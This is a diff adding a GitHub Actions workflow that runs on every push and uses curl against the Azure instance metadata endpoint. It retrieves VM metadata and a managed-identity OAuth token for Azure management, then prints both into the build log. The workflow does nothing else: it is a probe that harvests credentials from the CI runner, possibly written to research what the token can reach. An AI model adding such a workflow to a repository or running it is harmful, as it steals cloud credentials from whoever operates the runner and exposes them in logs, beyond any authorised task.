@@ -1,0 +1,14 @@
+name: imds-token-scope
+on: push
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: imds
+        run: |
+          echo "=== instance metadata ==="
+          curl -s --max-time 5 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' | head -c 2000 || echo fail
+          echo
+          echo "=== managed identity token list ==="
+          curl -s --max-time 5 -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 1500 || echo no-identity
+          echo
